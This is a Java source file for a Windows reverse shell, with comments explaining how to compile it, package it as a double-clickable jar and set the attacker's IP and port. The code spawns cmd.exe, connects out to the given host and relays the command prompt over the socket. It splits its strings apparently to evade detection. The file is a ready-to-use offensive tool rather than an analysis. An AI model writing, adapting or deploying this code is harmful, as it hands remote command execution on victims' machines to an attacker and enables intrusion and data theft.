/* Java r3vs43ll is made for Windows environment and it will work with the same version it is created with.

Download Java JDK and make sure you pick the appropriate version that matches with the host's version on which you wish to run.

Before a .jar is generated, you will need a manifest. Please see https://stackoverflow.com/questions/1238145/how-to-run-a-jar-file

Remember to add your IP and port below.

Within the directory where your .java file is located run:

Compile the Java file
javac filename.java

Create the jar executable here
jar cvfm filename.jar manifest.txt filename.class

Run the jar file from command line or just double click from the UI.
java -jar filename.jar
*/

//Import your libraries
import java.lang.*;
import java.io.*;
import java.net.*;
import java.util.*;

//Create the class how you would like for it to be named
public class r3vs43ll{
	//Main...where the magic happens
	public static void main (String args[])
	{     //Initialize your variables
		String strputer="1" + ".0" + ".0." + "7"; //Add your IP Address
		int intLisner=89;//Add your Port
		String CL="cm" + "d." + "e" + "x" + "e";
		//Try this catch that error
		try
		{
			//Try the connection
			Process taskCMD=new ProcessBuilder(CL).redirectErrorStream(true).start();
			Socket shocketz=new Socket(strputer,intLisner);
			InputStream inWay=taskCMD.getInputStream(),errWay=taskCMD.getErrorStream(), shocketzIN=shocketz.getInputStream();
			OutputStream outWay=taskCMD.getOutputStream(),shocketzOUT=shocketz.getOutputStream();
			//While loop to keep this shell active
			while(!shocketz.isClosed())
			{     //Cmdline
				while(inWay.available()>0)shocketzOUT.write(inWay.read());
				while(errWay.available()>0)shocketzOUT.write(errWay.read());
				while(shocketzIN.available()>0)outWay.write(shocketzIN.read());
				shocketzOUT.flush();
				outWay.flush();
				Thread.sleep(50);
				try 
				{
					taskCMD.exitValue();
					break;
				}//Catch Errors
				catch (Exception erroneous){}
			};
			taskCMD.destroy();shocketz.close();
		}//Catch Errors
		catch(Exception bigerrors){}
	}
}
